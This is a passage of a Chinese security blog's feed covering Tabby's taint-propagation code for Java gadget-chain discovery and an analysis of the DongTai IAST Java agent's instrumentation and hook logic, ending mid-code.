class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Branch 当前endNode</span></span><br><span class="line">   <span class="keyword">public</span> Node node = <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">// 上一个State</span></span><br><span class="line">   <span class="keyword">public</span> State preState = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// 下一个State</span></span><br><span class="line"><span class="keyword">public</span> State nextState = <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">// Branch 当前lastRelationship</span></span><br><span class="line">   <span class="keyword">public</span> Relationship lastRelationship = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">public</span> Calculator calculator = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">public</span> Set&lt;Integer&gt; polluted = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Relationship <span class="title">process</span><span class="params">(Relationship next)</span> </span>&#123;</span><br><span class="line">        Relationship ret = <span class="keyword">null</span>;</span><br><span class="line">        String nextId = next.getId() + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 如果是ALIAS关系</span></span><br><span class="line">        <span class="keyword">if</span>(Types.isAlias(next))&#123;</span><br><span class="line">            <span class="comment">// nextState.positions.put</span></span><br><span class="line">            <span class="comment">// 增加一条边的污点信息，沿用上一个节点的</span></span><br><span class="line">            nextState.put(nextId, polluted.stream().mapToInt(Integer::intValue).toArray());</span><br><span class="line">            <span class="comment">// alias 增加一条ALIAS</span></span><br><span class="line">            nextState.addAliasEdge(next.getId());</span><br><span class="line">            ret = next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 如果为CALL</span></span><br><span class="line">        <span class="comment">// 获取 污点信息</span></span><br><span class="line">            String pollutedStr = (String) next.getProperty(<span class="string">&quot;POLLUTED_POSITION&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(pollutedStr == <span class="keyword">null</span>) <span class="keyword">return</span> ret;</span><br><span class="line">            <span class="comment">// 解析污点映射关系，例如0-&gt;1,0-&gt;0</span></span><br><span class="line">            <span class="keyword">int</span>[][] callSite = JsonHelper.parse(pollutedStr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            // 为了处理当前设计的代码属性图的缺点，但测试后发现丢失的情况很多，暂不处理</span></span><br><span class="line"><span class="comment">//            if((!isAbstract || !isFromAbstractClass) &amp;&amp; !PositionHelper.isCallerPolluted(callSite, polluted))&#123; // 如果当前调用边的调用者不可控，则下一次不进行alias操作</span></span><br><span class="line"><span class="comment">//                nextState.getNextAlias().add(next.getId());</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span>[] nextPos = calculator.calculate(callSite, polluted);</span><br><span class="line">            <span class="keyword">if</span>(nextPos != <span class="keyword">null</span> &amp;&amp; nextPos.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                nextState.put(nextId, nextPos);</span><br><span class="line">                ret = next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Processer.process 实现了类似GadgetInspecotr的CallGraphDiscovery 污点传播计算。</p><ol><li>当前Node的Pollued污点，例如为0</li><li>经过当前RelationShip边，为下一个Node，下一个Node的POLLUTED_POSITION为0-&gt;0,1</li><li>计算出传播之后的Pollued污点为[0,1]</li><li>那么在nextState polluted里面增加一条记录，(边id，[0,1])，并通过</li><li>在下一次expand周期，state的值通过Process.init赋值给preState，并且取出pollued数组，根据lastRelationship获取当前Node的Pollued污点，如此循环</li></ol><p><strong>State</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;String, <span class="keyword">int</span>[]&gt; positions; <span class="comment">//保存id和污点信息</span></span><br><span class="line"><span class="keyword">private</span> List&lt;Long&gt; alias;</span><br><span class="line"><span class="keyword">private</span> List&lt;Long&gt; staticCalls;</span><br><span class="line"><span class="keyword">private</span> List&lt;Long&gt; nextAlias; </span><br></pre></td></tr></table></figure><h4 id="4-2-3-传播函数Demo"><a href="#4-2-3-传播函数Demo" class="headerlink" title="4.2.3 传播函数Demo"></a>4.2.3 传播函数Demo</h4><p><strong>Caculactor</strong></p><p>Caculactor 接口v2实现了根据上一个Call的POLLUTED_POSITION，和Node的polluted信息，计算下一个节点的polluted污点信息</p><p>ForwardedCalculator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] v2(<span class="keyword">int</span>[][] callSite, Set&lt;Integer&gt; polluted) &#123;</span><br><span class="line">    Set&lt;Integer&gt; nextPolluted = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> length = callSite.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> pos=<span class="number">0</span>; pos&lt;length; pos++)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] current = callSite[pos];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> c:current)&#123;</span><br><span class="line">            <span class="keyword">if</span>(polluted.contains(c))&#123;</span><br><span class="line">                nextPolluted.add(pos - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nextPolluted.stream().mapToInt(Integer::intValue).toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>callSite，由CALL.POLLUTED_POSITION</li><li>polluted，Node的污点信息，一般source节点，其值为-1</li><li>return nextPolluted，下一个Node的polluted</li></ul><p><img src="/images/pasted-351.png" alt="upload successful"></p><h2 id="0x05-总结与思考"><a href="#0x05-总结与思考" class="headerlink" title="0x05 总结与思考"></a>0x05 总结与思考</h2><p>思路结构上与GI区别不大，与GI的先passthrough再callgraph类似，tabby是先算Method的action，再算Call的pollutedPostion，但是在其基础上做了很多优化与拓展。</p><p>在实现需要的基础知识很多：</p><ul><li>Soot的FlowAnalysis 和ASM一样，也是需要对Jimple/Soot有较深的了解</li><li>Neo4j插件的实现也是，这块文档偏少，调试也困难</li></ul><p>没啥好说的，wh1t3p1g师傅🐮逼。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li>[1] <a href="https://github.com/knownsec/KCon/raw/master/2022/tabby%20java%20code%20review%20like%20a%20pro%E3%80%90KCon2022%E3%80%91.pdf">KCON: tabby java code review like a pro (by:wh1t3p1g)</a></li><li>[2] <a href="http://tttang.com/archive/1696/">tabby原理分析(by:cokeBeer)</a></li><li>[3] <a href="https://fynch3r.github.io/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/">Soot知识点整理(by:fynch3r)</a></li><li>[4] <a href="https://www.anquanke.com/post/id/234537">如何高效的挖掘Java反序列化利用链？(by:wh1t3p1g)</a></li><li>[5] <a href="https://www.anquanke.com/post/id/251814">如何高效地捡漏反序列化利用链？(by:wh1t3p1g)</a></li><li>[6] <a href="http://www.iro.umontreal.ca/~dufour/cours/ift6315/docs/soot-tutorial.pdf">soot-tutorial.pdf</a></li><li>[7] <a href="https://github.com/wh1t3p1g/tabby">wh1t3p1g/tabby</a></li><li>[8] <a href="https://github.com/wh1t3p1g/tabby-path-finder">tabby-path-finder</a></li><li>[9] <a href="https://view.csslcloud.net/api/view/index?roomid=D02BF113D16074BF9C33DC5901307461&userid=AEE7F6605EBD1C01">KCON 视频</a></li><li>[10] <a href="https://neoneo4j.com/docs/java-reference/current/extending-neo4j/project-setup/">Neo4j Docs: extending</a></li><li>[11] <a href="https://neo4j.com/docs/java-reference/current/traversal-framework/">Neo4j Docs: traversal-framework</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;与GadgetInspector 类似，Tabby 也是通过污点分析来实现的Gadget Chain挖掘。不同的是&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tabby 用soot 来做的静态污点分析，GadgetInspector 是用的ASM 模拟来做的污点跟踪&lt;/li&gt;
&lt;li&gt;用了Neo4j来做CPG 的查询与展示，要灵活很多&lt;/li&gt;
&lt;li&gt;优化了污点传播关系&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;据说Tabby 一开始是wh1t3p1g师傅的毕设，不过当时没放出tabby-path-finder，因此一直没太关注Tabby 污点分析这块，都是用手动白名单来做过滤的。KCon上师傅的PPT，收获很多，学习总结下。这里主要关注&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Tabby 污点传播规则&lt;/li&gt;
&lt;li&gt;Tabby soot 污点分析的实现&lt;/li&gt;
&lt;li&gt;Tabby Neo4j 搜索实现&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注：本文需要对soot 有一定了解，参考fynch3r 师傅的参考【3】。&lt;/p&gt;
&lt;h2 id=&quot;0x02-Soot-数据流分析&quot;&gt;&lt;a href=&quot;#0x02-Soot-数据流分析&quot; class=&quot;headerlink&quot; title=&quot;0x02 Soot 数据流分析&quot;&gt;&lt;/a&gt;0x02 Soot 数据流分析&lt;/h2&gt;&lt;p&gt;四步走：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-320.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="程序分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Tabby" scheme="http://m0d9.me/tags/Tabby/"/>
    
    <category term="污点分析" scheme="http://m0d9.me/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>DongTai IAST Java Agent分析</title>
    <link href="http://m0d9.me/2022/10/18/DongTai-IAST-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/10/18/DongTai-IAST-%E5%88%86%E6%9E%90/</id>
    <published>2022-10-18T02:19:00.000Z</published>
    <updated>2022-10-27T02:12:18.562Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-背景知识"><a href="#0x1-背景知识" class="headerlink" title="0x1 背景知识"></a>0x1 背景知识</h2><p>IAST 概念虽然很早就提出了，但是在实际使用情况中，因为其生产无侵入性与漏误报情况，实际使用效果还是不过的。</p><h3 id="1-1-IAST"><a href="#1-1-IAST" class="headerlink" title="1.1 IAST"></a>1.1 IAST</h3><ul><li>DAST (Dynamic Application Security Testing)</li><li>IAST (Interactive Application Security Testing)</li><li>RASP（Runtime Application Self-protection）</li><li>SAST (Static Application Security Testing)</li></ul><p>属IAST 最模糊，与三者都有纠缠。</p><h3 id="1-2-主动-与-被动"><a href="#1-2-主动-与-被动" class="headerlink" title="1.2 主动 与 被动"></a>1.2 主动 与 被动</h3><h4 id="1-2-1-主动IAST"><a href="#1-2-1-主动IAST" class="headerlink" title="1.2.1 主动IAST"></a>1.2.1 主动IAST</h4><p>主动IAST很简单，可以简单理解为 动态IAST = DAST + RASP</p><p><img src="/images/pasted-294.png" alt="upload successful"></p><a id="more"></a><h4 id="1-2-2-被动IAST"><a href="#1-2-2-被动IAST" class="headerlink" title="1.2.2 被动IAST"></a>1.2.2 被动IAST</h4><blockquote><p>被动型IAST是指使用动态污点分析技术，不需要扫描端，直接判断敏感参数是否为用户可控。插桩程序需要实现动态污点分析逻辑，实时监控程序污点数据变化，检测污点是否由source传播到sink点。</p></blockquote><p><img src="/images/pasted-295.png" alt="upload successful"></p><p>单看解释是有些疑问的：</p><ol><li>如果经历了安全函数，理论上用户输入会被过滤，变得不可控，这个怎么在被动上实现？</li><li>如果只是判断用户输入是否可控，为什么需要整个source 到sink 的stack，只看source 和sink 不行吗？</li></ol><h2 id="0x2-DongTai-IAST"><a href="#0x2-DongTai-IAST" class="headerlink" title="0x2 DongTai IAST"></a>0x2 DongTai IAST</h2><p>洞态IAST，原灵芝IAST，是国内首款开源的IAST，采用的也是“被动IAST” 技术，带着以上的问题，我们探究探究DongTai IAST的实现。</p><p>建议先看看su18师傅的《洞态 IAST 试用》，参考【1】，su18师傅的文章写的极好。</p><h3 id="2-1-前提"><a href="#2-1-前提" class="headerlink" title="2.1 前提"></a>2.1 前提</h3><p>DongTai 开源的有很多安全项目，这里只关注这两个</p><ul><li><a href="https://github.com/HXSecurity/DongTai">HXSecurity/DongTai</a>： Server</li><li><a href="https://github.com/HXSecurity/DongTai-agent-java">HXSecurity/DongTai-agent-java</a>：Java Agent</li></ul><p>DongTai 支持Java/Python/PHP/GO，这里仅对Java Agent 进行分析。<br>一开始以为Server功能比较简单，其实不是，Server也实现了一套污点逻辑，通过Agent上报的调用链进行判断，不过这里暂时先不关注。</p><h3 id="2-2-Server"><a href="#2-2-Server" class="headerlink" title="2.2 Server"></a>2.2 Server</h3><p>Server 采用Django + Celery，Celery broker 用的Redis，Django 数据库用的MySQL。重点关注自定义规则</p><h4 id="2-2-1-规则"><a href="#2-2-1-规则" class="headerlink" title="2.2.1 规则"></a>2.2.1 规则</h4><ul><li>污点源方法 Source</li><li>传播方法 Propagate</li><li>过滤方法 Filter</li><li>危险防范 Sink</li></ul><p><img src="/images/pasted-296.png" alt="upload successful"></p><ul><li>规则详情：方法的signature</li><li>污点输入：O/Px</li><li>污点输出：O/Px/R</li><li>Hook深度：是否也允许Hook子类的方法</li></ul><h4 id="2-2-2-传播方法Propagate"><a href="#2-2-2-传播方法Propagate" class="headerlink" title="2.2.2 传播方法Propagate"></a>2.2.2 传播方法Propagate</h4><p>如果分析过GadgetInspector 或者Tabby 的污点传播，那么对这些规则应该不会陌生。</p><p>传播方法描述的是一个污点在函数的路径，其中</p><ol><li>污点输入可以是：<ul><li>this，也就是object</li><li>args，方法的参数</li></ul></li><li>污点输出可以是：<ul><li>this，可以是object、field</li><li>return，返回值</li><li>args，注意这里，也就是Tabby 对GI的改进点</li></ul></li></ol><p>Source、Filter、Sink 都可以看作一种特殊的传播方法propagate。</p><h4 id="2-2-3-污点分析逻辑"><a href="#2-2-3-污点分析逻辑" class="headerlink" title="2.2.3 污点分析逻辑"></a>2.2.3 污点分析逻辑</h4><p>其实在Server 上，也是有一套污点判断逻辑，@TODO 待补充。</p><h3 id="2-3-Agent"><a href="#2-3-Agent" class="headerlink" title="2.3 Agent"></a>2.3 Agent</h3><h4 id="2-3-1-Java-Instrumentation-插桩"><a href="#2-3-1-Java-Instrumentation-插桩" class="headerlink" title="2.3.1 Java Instrumentation 插桩"></a>2.3.1 Java Instrumentation 插桩</h4><p>Java 两种插桩方式</p><ul><li>premain        agent 方式</li><li>agentmain        attach 方式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load Class:&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在transfrom 中实现动态修改类，从而实现方法的Hook。</p><p>在DongTai中，具体为io.dongtai.iast.agent.AgentLauncher</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.dongtai.iast.agent.AgentLauncher#premain&#x2F;agentmain</span><br><span class="line">io.dongtai.iast.agent.AgentLauncher#install</span><br><span class="line">io.dongtai.iast.agent.AgentLauncher#loadEngine</span><br><span class="line">io.dongtai.iast.agent.manager.EngineManager#install</span><br></pre></td></tr></table></figure><p>install 会从server下载</p><ul><li>dongtai-core.jar</li><li>dongtai-spy.jar</li></ul><p>然后调用其中的install进行安装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String spyPackage = EngineManager.getInjectPackageCachePath();</span><br><span class="line">    String corePackage = EngineManager.getEnginePackageCachePath();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JarFile file = <span class="keyword">new</span> JarFile(<span class="keyword">new</span> File(spyPackage));</span><br><span class="line">        inst.appendToBootstrapClassLoaderSearch(file);</span><br><span class="line">        file.close();</span><br><span class="line">        <span class="keyword">if</span> (IAST_CLASS_LOADER == <span class="keyword">null</span>) &#123;</span><br><span class="line">            IAST_CLASS_LOADER = <span class="keyword">new</span> IastClassLoader(corePackage);</span><br><span class="line">        &#125;</span><br><span class="line">        classOfEngine = IAST_CLASS_LOADER.loadClass(ENGINE_ENTRYPOINT_CLASS);</span><br><span class="line">        String agentPath = <span class="keyword">this</span>.getClass().getProtectionDomain().getCodeSource().getLocation().getFile();</span><br><span class="line">        classOfEngine.getMethod(<span class="string">&quot;install&quot;</span>, String.class, String.class, Integer.class, Instrumentation.class,</span><br><span class="line">                        String.class)</span><br><span class="line">                .invoke(<span class="keyword">null</span>, launchMode, <span class="keyword">this</span>.properties.getPropertiesFilePath(),</span><br><span class="line">                        AgentRegisterReport.getAgentFlag(), inst, agentPath);</span><br><span class="line">        setRunningStatus(<span class="number">0</span>);</span><br><span class="line">        setCoreStop(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.secnium.iast.core.AgentEngine#_init</span><br><span class="line">com.secnium.iast.core.AgentEngine#install</span><br><span class="line">com.secnium.iast.core.AgentEngine#run</span><br><span class="line">TransformEngine#start</span><br><span class="line">Instrumentation#addTransformer(IastClassFileTransformer)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IastClassFileTransformer#retransfrom</span><br><span class="line">IastClassFileTransformer#transfrom</span><br></pre></td></tr></table></figure><h4 id="2-3-2-retransfrom-Hook预处理"><a href="#2-3-2-retransfrom-Hook预处理" class="headerlink" title="2.3.2 retransfrom: Hook预处理"></a>2.3.2 retransfrom: Hook预处理</h4><p>IastClassFileTransformer#retransfrom 中实现了对Hook类的修改。具体逻辑如下：</p><ol><li><p>findForRetransform 发现所有的待Hook类，具体通过inst.getAllLoadedClasses 获取所有加载的类</p></li><li><p>通过configMatcher.isHookClassPoint(clazz) 简单筛选是否需要Hook，过一遍黑名单</p></li><li><p>通过classDiagram 获取该class的父类、接口</p></li><li><p>如果其中有在IastHookRuleModel.isHookClass()的，则会进入hook。isHookClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHookClass</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> hookClassnames.contains(className) || superClassHookPoints.contains(className) || hookBySuffix(className);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">hookBySuffix</span><span class="params">(String classname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String suffix : instance.suffixHookPoints) &#123;</span><br><span class="line">        <span class="keyword">if</span> (classname.endsWith(suffix)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-297.png" alt="upload successful"></p></li></ol><blockquote><p>问题：可以看到，Hook点内置，并没有控制台配置的sources/propagate/filter/sink，是在哪里实现hook的呢？</p></blockquote><blockquote><p>答案：不要被hook这个词迷惑，这里的isHookClass只有在findForRetransform中被用到，用来标记需要重载的类，并不是所有需要hook的类，需要hook的泪是在transfrom中的plugins dispatch中实现的。</p></blockquote><ol start="5"><li>随后调用 retransformClasses() 会让类重新加载，从而使得注册的类修改器能够重新修改类的字节码，这要就会调用之前通过 addTransformer() 注册的 IASTClassFileTransformer 中重写的 transform() 方法。</li></ol><h4 id="2-3-3-transfrom"><a href="#2-3-3-transfrom" class="headerlink" title="2.3.3 transfrom"></a>2.3.3 transfrom</h4><p>具体逻辑如下：</p><ol><li><p>如果是iast的类，则不进行任何处理</p></li><li><p>设置DONGTAI_STATE 标志，表示是否是IAST 内部代码</p></li><li><p>实现SCA，这个后续再跟</p></li><li><p>判断当前类是否在hook点黑名单。在在blacklist.txt 里维护了个7W多的hook黑名单： </p><ul><li>agent自身的类</li><li>已知的框架类、中间件类</li><li>类名为null</li><li>JDK内部类且不在hook点配置白名单中</li><li>接口</li></ul></li><li><p>创建 ClassWriter，依然是使用 COMPUTE_FRAMES 自动计算帧的大小，并且重写了getCommonSuperClass() 方法，在计算两个类共同的父类时指定ClassLoader。</p></li><li><p>创建 IASTContext 上下文，初始化 PluginRegister，这个类中包含了一个全局常量 PLUGINS，里面保存了很多的处理插件，这些类都实现了 DispatchPlugin 接口，这个接口包含两个方法：</p><ul><li>dispatch()：分发不同的 classVisitor 处理对应的类</li><li>isMatch()：判断是否命中当前插件</li></ul></li><li><p>在 ClassVisitor 中又通过重写 visitMethod() ，注册继承至 AbstractAdviceAdapter 的实现类，这些类重写父类的 before()/after() ，实际上是 AdviceAdapter 的 onMethodEnter()/onMethodExit() 实现了字节码的插入。详见下面plugins 一节。</p></li></ol><p><img src="/images/pasted-308.png" alt="upload successful"></p><h4 id="2-3-4-Plugins"><a href="#2-3-4-Plugins" class="headerlink" title="2.3.4 Plugins"></a>2.3.4 Plugins</h4><p>默认内置的Plugins：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PluginRegister</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.plugins = <span class="keyword">new</span> ArrayList&lt;DispatchPlugin&gt;();</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchSpringApplication());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchJ2ee());</span><br><span class="line">        <span class="comment">//PLUGINS.add(new DispatchJsp());</span></span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchCookie());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchDubbo());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchKafka());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchJdbc());</span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchShiro());</span><br><span class="line"><span class="comment">//        this.plugins.add(new DispatchHandlerInterceptor());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//PLUGINS.add(new DispatchSpringAutoBinding());</span></span><br><span class="line">        <span class="keyword">this</span>.plugins.add(<span class="keyword">new</span> DispatchClassPlugin());</span><br><span class="line">        plugins.add(<span class="keyword">new</span> DispatchGrpc());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>以DispatchShiro为例，重写了readSession方法，在内部增加了SpyDispatcherHandler#getDispatcher SpyDispatcher#isReplayRequest等逻辑调用，具体逻辑在SpyDispatcherImpl 中。</p><p><img src="/images/pasted-300.png" alt="upload successful"><br><img src="/images/pasted-299.png" alt="upload successful"></p><p>Plugins中，DispatchClassPlugin 比较特殊，dispatch中逻辑交由 PropagateAdviceAdapter/SinkAdviceAdapter/SourceAdviceAdapter处理，也就是控制台配置的Source、Sink、Propagate逻辑。</p><p><img src="/images/pasted-301.png" alt="upload successful"></p><h4 id="2-3-5-SpyDispatcherImpl"><a href="#2-3-5-SpyDispatcherImpl" class="headerlink" title="2.3.5 SpyDispatcherImpl"></a>2.3.5 SpyDispatcherImpl</h4><p>大部分的插桩逻辑都在SpyDispatcherImpl 中实现，比如SourceAdviceAdapter 的before。</p><p><img src="/images/pasted-309.png" alt="upload successful"></p><p>IastClassFileTransformer 在初始化的时候进行了SpyDispatcherHandler的初始化SpyDispatcherImpl，以供全局使用。</p><h2 id="0x3-功能分析"><a href="#0x3-功能分析" class="headerlink" title="0x3 功能分析"></a>0x3 功能分析</h2><h3 id="3-1-SCA"><a href="#3-1-SCA" class="headerlink" title="3.1 SCA"></a>3.1 SCA</h3><p><img src="/images/pasted-302.png" alt="upload successful"></p><p>通过sendReport接口发送给server</p><p><img src="/images/pasted-303.png" alt="upload successful"></p><h3 id="3-2-漏洞判断"><a href="#3-2-漏洞判断" class="headerlink" title="3.2 漏洞判断"></a>3.2 漏洞判断</h3><p>这块su18师傅已经讲了个大概逻辑，但是没具体讲污点传播，这里详细讲下。</p><p>以普通http漏洞为例，这个过程会经历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DispatchClassPlugin#dispatch</span><br><span class="line">SourceAdviceAdapter#before/after</span><br><span class="line">    PropagateAdviceAdapter#before/after</span><br><span class="line">    SinkAdviceAdapter#before/after</span><br><span class="line">      AbstractAdviceAdapter#captureMethodState</span><br><span 